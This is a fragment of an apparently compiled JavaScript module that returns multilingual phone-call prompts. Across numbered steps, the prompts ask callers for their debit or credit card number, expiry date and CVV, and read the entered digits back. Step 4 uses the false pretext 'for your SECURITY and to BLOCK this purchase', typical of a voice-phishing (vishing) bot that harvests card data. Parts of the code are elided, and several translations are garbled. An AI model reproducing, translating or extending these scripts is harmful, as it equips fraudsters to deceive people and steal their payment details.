...
exports.getLangStep = void 0;
const getLangStep = ({ language, step, dtmf, cardType, }) => {
    switch (step) {
        case `1`:
            return {
                ...
                'es-ES': `No has ingresado nada. Necesitamos verificarlo, ingrese su número de tarjeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido de la tecla numeral.`,
                'pt-PT': `Você não digitou nada. Precisamos verificá-lo, digite o número do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da chave de sustenido.`,
                'pt-BR': `Você não digitou nada. Precisamos verificá-lo, digite o número do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da chave de sustenido.`,
                'it-IT': `Non hai inserito nulla. Abbiamo bisogno di verificarti, inserisci il numero della tua carta di ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBITO`
                        : `CREDITO`} seguito dal cancelletto.`,
                'fr-FR': `Vous n'avez rien saisi. Nous devons vous vérifier, veuillez entrer votre numéro de carte ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `CRÉDIT`} suivi de la touche dièse.`,
                'de-DE': `Sie haben nichts eingegeben. Wir müssen Sie verifizieren, bitte geben Sie Ihre ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}Kartennummer gefolgt von der Raute-Taste ein.`,
                'nb-NO': `Du har ikke lagt inn noe. Vi må bekrefte deg, vennligst skriv inn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debet`
                        : `kreditt`}kortnummeret ditt etterfulgt av pundnøkkelen.`,
                'pl-PL': `Nic nie wpisałeś. Musimy Cię zweryfikować, wprowadź numer karty ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `KREDYT`}, a następnie krzyżyk.`,
                'sv-SE': `Du har inte angett något. Vi måste verifiera dig. Ange ditt ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `betal`
                        : `KREDIT`}kortsnummer följt av pundnyckeln.`,
                'tr-TR': `Hiçbir şey girmediniz. Sizi doğrulamamız gerekiyor, lütfen ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `BANKA`
                        : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                'cy-GB': `Nid ydych wedi nodi unrhyw beth. Mae angen i ni eich gwirio, rhowch rif eich cerdyn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debyd`
                        : `CREDYD`} ac yna'r allwedd punt.`,
                'nl-NL': `U heeft niets ingevuld. We moeten u verifiëren. Voer uw ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `CREDIT-`}kaartnummer in gevolgd door het hekje.`,
                'da-DK': `Du har ikke indtastet noget. Vi skal bekræfte dig. Indtast venligst dit ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}kortnummer efterfulgt af pund-tasten.`,
                'ca-ES': `No has introduït res. Hem de verificar-vos, si us plau, introduïu el número de la vostra targeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÈBIT`
                        : `CRÈDIT`} seguit de la clau.`,
            }[language];
        case `2`:
            return {
        ...
        case `4`:
            return {
                ...
                'es-ES': `El número de tarjeta que ha introducido es incorrecto. Por su SEGURIDAD y para BLOQUEAR esta compra, ingrese su número de tarjeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido de la tecla numeral.`,
                'pt-PT': `O número do cartão que você digitou está incorreto. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da chave sustenido.`,
                'pt-BR': `O número do cartão que você digitou está incorreto. Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da chave sustenido.`,
                'it-IT': `Il numero della carta che hai inserito non è corretto. Per la tua SICUREZZA e per BLOCCARE questo acquisto, inserisci il numero della tua carta di ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBITO`
                        : `CREDITO`} seguito dal cancelletto.`,
                'fr-FR': `Le numéro de carte que vous avez entré est incorrect. Pour votre SÉCURITÉ et pour BLOQUER cet achat, veuillez entrer votre numéro de carte ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `CRÉDIT`} suivi de la touche dièse.`,
                'de-DE': `Die eingegebene Kartennummer ist falsch. Bitte geben Sie zu Ihrer SICHERHEIT und um diesen Kauf zu BLOCKIEREN Ihre ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}Kartennummer gefolgt von der Raute-Taste ein.`,
                'nb-NO': `Kortnummeret du har oppgitt er feil. For din SIKKERHET og for å BLOKKERE dette kjøpet, skriv inn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debet`
                        : `kreditt`}kortnummeret etterfulgt av pund-tasten.`,
                'pl-PL': `Wprowadzony numer karty jest nieprawidłowy. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ ten zakup, wprowadź numer karty ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `KREDYT`}, a następnie krzyżyk.`,
                'sv-SE': `Kortnumret du har angett är felaktigt. För din SÄKERHET och för att BLOCKERA detta köp, vänligen ange ditt ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `betal`
                        : `KREDIT`}kortsnummer följt av pundtangenten.`,
                'tr-TR': `Girdiğiniz kart numarası yanlış. GÜVENLİĞİNİZ için ve bu satın alma işlemini ENGELLEMEk için lütfen ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `BANKA`
                        : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                'cy-GB': `Mae rhif y cerdyn rydych chi wedi'i nodi yn anghywir. Ar gyfer eich DIOGELWCH ac i flocio'r pryniant hwn, rhowch rif eich cerdyn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debyd`
                        : `CREDYD`} ac yna'r allwedd punt.`,
                'nl-NL': `Het door u ingevoerde kaartnummer is onjuist. Voor uw VEILIGHEID en om deze aankoop te BLOKKEREN, voert u uw ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `CREDIT-`}kaartnummer in, gevolgd door het hekje.`,
                'da-DK': `Kortnummeret du har indtastet er forkert. For din SIKKERHED og for at BLOKERE dette køb skal du indtaste dit ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}kortnummer efterfulgt af pund-tasten.`,
                'ca-ES': `El número de targeta que heu introduït és incorrecte. Per a la vostra SEGURETAT i per BLOQUEAR aquesta compra, introduïu el número de la vostra targeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÈBIT`
                        : `CRÈDIT`} seguit de la clau diari.`,
            }[language];
        case `5`:
            return {
                ...
                'es-ES': `EXCELENTE, ingresó ${dtmf}. Ingrese la fecha de vencimiento de su tarjeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguida de la tecla numeral.`,
                'pt-PT': `ÓTIMO, você digitou ${dtmf}. Por favor, digite a data de validade do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguida da chave sustenido.`,
                'pt-BR': `ÓTIMO, você digitou ${dtmf}. Por favor, digite a data de validade do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguida da chave sustenido.`,
                'it-IT': `GRANDE, hai inserito ${dtmf}. Inserisci la data di scadenza della tua carta di ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBITO`
                        : `CREDITO`} seguita dal cancelletto.`,
                'fr-FR': `SUPER, vous avez entré ${dtmf}. Veuillez entrer la date d'expiration de votre carte ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `CRÉDIT`} suivie de la touche dièse.`,
                'de-DE': `GROSSARTIG, Sie haben ${dtmf} eingegeben. Bitte geben Sie das Ablaufdatum Ihrer ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}Karte gefolgt von der Raute-Taste ein.`,
                'nb-NO': `FLOTT, du har skrevet inn ${dtmf}. Vennligst skriv inn utløpsdatoen for ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debet`
                        : `kreditt`}kortet ditt etterfulgt av pundnøkkelen.`,
                'pl-PL': `ŚWIETNIE, wpisałeś ${dtmf}. Wprowadź datę ważności karty ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `KREDYT`}, a następnie krzyżyk.`,
                'sv-SE': `BRA, du har angett ${dtmf}. Ange ditt ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `betal`
                        : `KREDIT`}korts utgångsdatum följt av pundnyckeln.`,
                'tr-TR': `BÜYÜK, ${dtmf} girdiniz. Lütfen ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `BANKA`
                        : `KREDİ`} kartınızın son kullanma tarihini ve ardından kare anahtarını girin.`,
                'cy-GB': `GWYCH, rydych wedi nodi ${dtmf}. Nodwch ddyddiad dod i ben eich cerdyn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debyd`
                        : `CREDYD`} ac yna'r allwedd punt.`,
                'nl-NL': `GEWELDIG, u heeft ${dtmf} ingevoerd. Voer de vervaldatum van uw ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `CREDIT-`}kaart in, gevolgd door het hekje.`,
                'da-DK': `FANTASTISK, du har indtastet ${dtmf}. Indtast venligst dit ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}korts udløbsdato efterfulgt af pund-tasten.`,
                'ca-ES': `GENIAL, heu introduït ${dtmf}. Introduïu la data de caducitat de la vostra targeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÈBIT`
                        : `CRÈDIT`} seguida de la clau.`,
            }[language];
        case `6`:
            return {
                ...
                'es-ES': `La fecha de caducidad que ha introducido es incorrecta. Ingrese la fecha de vencimiento de su tarjeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguida de la tecla numeral.`,
                'pt-PT': `A data de expiração que você inseriu está incorreta. Por favor, insira a data de validade do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguida da chave de sustenido.`,
                'pt-BR': `A data de expiração que você inseriu está incorreta. Por favor, insira a data de validade do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguida da chave de sustenido.`,
                'it-IT': `La data di scadenza che hai inserito non è corretta. Inserisci la data di scadenza della tua carta di ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBITO`
                        : `CREDITO`} seguita dal cancelletto.`,
                'fr-FR': `La date d'expiration que vous avez entrée est incorrecte. Veuillez entrer la date d'expiration de votre carte ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `CRÉDIT`} suivie de la touche dièse.`,
                'de-DE': `Das von Ihnen eingegebene Ablaufdatum ist falsch. Bitte geben Sie das Ablaufdatum Ihrer ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}Karte gefolgt von der Rautetaste ein.`,
                'nb-NO': `Utløpsdatoen du har oppgitt er feil. Vennligst skriv inn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debet`
                        : `kreditt`}kortets utløpsdato etterfulgt av pundnøkkelen.`,
                'pl-PL': `Wprowadzona data ważności jest nieprawidłowa. Wprowadź datę ważności karty ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `KREDYT`}, a następnie krzyżyk.`,
                'sv-SE': `Det utgångsdatum du har angett är felaktigt. Ange ditt ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `betal`
                        : `KREDIT`}korts utgångsdatum följt av pundnyckeln.`,
                'tr-TR': `Girdiğiniz son kullanma tarihi yanlış. Lütfen ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `BANKA`
                        : `KREDİ`} kartınızın son kullanma tarihini ve ardından kare anahtarını girin.`,
                'cy-GB': `Mae'r dyddiad dod i ben rydych chi wedi'i nodi yn anghywir. Nodwch ddyddiad dod i ben eich cerdyn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debyd`
                        : `CREDYD`} ac yna'r allwedd punt.`,
                'nl-NL': `De door u ingevulde vervaldatum is onjuist. Voer de vervaldatum van uw ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `CREDIT-`}kaart in, gevolgd door het pondje.`,
                'da-DK': `Den udløbsdato, du har indtastet, er forkert. Indtast venligst dit ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}korts udløbsdato efterfulgt af pundnøglen.`,
                'ca-ES': `La data de caducitat que heu introduït és incorrecta. Si us plau, introduïu la data de caducitat de la vostra targeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÈBIT`
                        : `CRÈDIT`} seguida de la clau.`,
        ...
        case `7`:
            return {
                ...
                'es-ES': `EXCELENTE, ha ingresado ${dtmf}. Ingrese el CVV de su tarjeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido de la tecla numeral.`,
                'pt-PT': `ÓTIMO, você digitou ${dtmf}. Por favor, digite o CVV do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da tecla sustenido.`,
                'pt-BR': `ÓTIMO, você digitou ${dtmf}. Por favor, digite o CVV do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da tecla sustenido.`,
                'it-IT': `GRANDE, hai inserito ${dtmf}. Inserisci il CVV della tua carta di ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBITO`
                        : `CREDITO`} seguito dal cancelletto.`,
                'fr-FR': `SUPER, vous avez saisi ${dtmf}. Veuillez saisir le CVV de votre carte ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `CRÉDIT`} suivi de la touche dièse.`,
                'de-DE': `GROSSARTIG, Sie haben ${dtmf} eingegeben. Bitte geben Sie den CVV Ihrer ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}Karte gefolgt von der Raute-Taste ein.`,
                'nb-NO': `FLOTT, du har skrevet inn ${dtmf}. Vennligst skriv inn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debet`
                        : `kreditt`}kort CVV etterfulgt av pund-nøkkelen.`,
                'pl-PL': `ŚWIETNIE, wpisałeś ${dtmf}. Wprowadź CVV karty ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `KREDYT`}OWEJ, a następnie krzyżyk.`,
                'sv-SE': `BRA, du har angett ${dtmf}. Ange ditt ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `betal`
                        : `KREDIT`}kort CVV följt av pundnyckeln.`,
                'tr-TR': `BÜYÜK, ${dtmf} girdiniz. Lütfen ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `BANKA`
                        : `KREDİ`} kartınızın CVV'sini ve ardından kare anahtarını girin.`,
                'cy-GB': `GWYCH, rydych wedi nodi ${dtmf}. Rhowch eich CVV cerdyn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debyd`
                        : `CREDYD`} ac yna allwedd y bunt.`,
                'nl-NL': `GEWELDIG, u heeft ${dtmf} ingevoerd. Voer uw ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `CREDIT-`}kaart CVV in gevolgd door het hekje.`,
                'da-DK': `FANTASTISK, du har indtastet ${dtmf}. Indtast venligst dit ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}kort CVV efterfulgt af pund-tasten.`,
                'ca-ES': `Genial, heu introduït ${dtmf}. Introduïu el CVV de la vostra targeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÈBIT`
        ...
        case `8`:
            return {
                ...
                'es-ES': `El número de CVV que ha introducido es incorrecto. Ingrese el CVV de su tarjeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido de la tecla numeral.`,
                'pt-PT': `O número CVV que você digitou está incorreto. Por favor, digite o CVV do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da chave de sustenido.`,
                'pt-BR': `O número CVV que você digitou está incorreto. Por favor, digite o CVV do seu cartão de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÉBITO`
                        : `CRÉDITO`} seguido da chave de sustenido.`,
                'it-IT': `Il numero CVV che hai inserito non è corretto. Inserisci il CVV della tua carta di ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBITO`
                        : `CREDITO`} seguito dal cancelletto.`,
                'fr-FR': `Le numéro CVV que vous avez entré est incorrect. Veuillez saisir le CVV de votre carte ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `CRÉDIT`} suivi de la touche dièse.`,
                'de-DE': `Die eingegebene CVV-Nummer ist falsch. Bitte geben Sie den CVV Ihrer ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}Karte gefolgt von der Raute-Taste ein.`,
                'nb-NO': `CVV-nummeret du har oppgitt er feil. Vennligst skriv inn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debet`
                        : `kreditt`}kortet CVV etterfulgt av pundnøkkelen.`,
                'pl-PL': `Wprowadzony numer CVV jest nieprawidłowy. Wprowadź CVV karty ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT`
                        : `KREDYT`}, a następnie krzyżyk.`,
                'sv-SE': `CVV-numret du har angett är felaktigt. Vänligen ange ditt ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `betal`
                        : `KREDIT`}kort CVV följt av pundnyckeln.`,
                'tr-TR': `Girdiğiniz CVV numarası yanlış. Lütfen ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `BANKA`
                        : `KREDİ`} kartınızın CVV'sini ve ardından kare anahtarını girin.`,
                'cy-GB': `Mae'r rhif CVV a roesoch yn anghywir. Rhowch CVV eich cerdyn ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `debyd`
                        : `CREDYD`} ac yna'r allwedd punt.`,
                'nl-NL': `Het door u ingevulde CVV-nummer is onjuist. Voer uw ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `CREDIT-`}kaart CVV in, gevolgd door het hekje.`,
                'da-DK': `Det CVV-nummer, du har indtastet, er forkert. Indtast venligst dit ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DEBIT-`
                        : `KREDIT`}kort CVV efterfulgt af pund-nøglen.`,
                'ca-ES': `El número de CVV que heu introduït és incorrecte. Si us plau, introduïu la vostra targeta de ${cardType === ``
                    ? ``
                    : cardType && cardType.toLowerCase() === `debit`
                        ? `DÈBIT`
                        : `CRÈDIT`} CVV seguit de la clau de lliura.`,
            }[language];
        case `9`:
            return {
...
exports.getLangStep = getLangStep;
